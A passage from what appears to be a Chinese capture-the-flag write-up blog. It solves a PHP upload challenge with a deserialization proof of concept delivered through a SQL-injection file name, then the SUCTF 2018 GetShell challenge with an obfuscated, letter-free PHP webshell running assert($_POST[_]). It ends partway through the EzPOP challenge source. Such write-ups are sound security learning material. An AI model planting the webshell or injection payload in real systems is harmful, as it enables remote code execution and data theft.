class="keyword">$this</span>-&gt;getfile(<span class="variable">$input</span>);</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_ext</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = serialize(<span class="variable">$my_ext</span>);</span><br><span class="line">        <span class="variable">$id</span> = <span class="keyword">$this</span>-&gt;save(<span class="variable">$array</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">            <span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;check(<span class="variable">$_FILES</span>[<span class="variable">$input</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rs</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$basename</span> = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = substr(strrchr(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$title</span> = str_replace(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="keyword">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data</span> || !is_array(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$id</span> = <span class="keyword">$this</span>-&gt;insert_array(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable">$con</span> = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (mysqli_connect_errno(<span class="variable">$con</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$key_temp</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">            <span class="variable">$value_temp</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line">            <span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">        mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$id</span> = mysqli_insert_id(<span class="variable">$con</span>);</span><br><span class="line">        mysqli_close(<span class="variable">$con</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="literal">False</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            <span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># Read some config html</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现view_files方法中file_get_contents，可以进行文件读取，而show.php中存在unserialize，那么就可以进行反序列化读取文件。</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize(<span class="variable">$x</span>));</span><br></pre></td></tr></table></figure><p>使用十六进制编码是为了绕过protected。</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>反序列化构造完成了，接下来就是看看如何到达入口。</p><p>从show.php中可以看出，入口是sql读取的attr键值，而我们在上传时会经过一个check()函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$basename</span> = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$ext</span> = substr(strrchr(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$title</span> = str_replace(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="keyword">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们只有$filename可控，而$title的值为上传的文件名去掉后缀的值，即上传了一个文件名为a.png，则title为a。</p><p>于是我们可以控制title时后面的语句失效，从而达到控制变量的目的，这样attr的键值就可控了。</p><p>修改文件名上传。</p><blockquote><p>filename=”1’,’1’,’1’,’1’,0x4f3a363a2268656c706572223a323a7b733a393a22002a00636f6e666967223b733a353a222f666c6167223b733a393a22002a00696676696577223b623a313b7d)#.png”</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210812111351572.png"></p><p>上传后去show.php执行，就可以拿到flag了。</p><blockquote><p>flag{ab9b67fb-c05c-45ce-b223-c9bb1247dc34}</p></blockquote><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><h3 id="无字母数字upload"><a href="#无字母数字upload" class="headerlink" title="无字母数字upload"></a>无字母数字upload</h3><p>找了找发现只有upload的点，还有黑名单。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=substr(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简单测试一下发现只给了一些字符，字母和数字都ban了。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210813182603302.png"></p><p>异或也没了，那只能取反了，这里直接给poc。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=[];</span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$__</span>==<span class="variable">$__</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable">$__</span>=~(融); <span class="comment">// a</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(匆); <span class="comment">// s</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>].<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(随); <span class="comment">// e</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(千); <span class="comment">// r</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(苦); <span class="comment">// t</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(~(_)); <span class="comment">// _</span></span><br><span class="line"><span class="variable">$__</span>=~(诗); <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(尘); <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(欣); <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(站); <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><p>上传后在phpinfo的环境变量里可以看到flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210813190419027.png"></p><h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>题目给出源码，有点复杂的 POP 链构造，但主要知识点不难。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cachedProperties</span> = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = array_intersect_key(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([<span class="variable">$cleaned</span>, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;getExpireTime(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir(<span 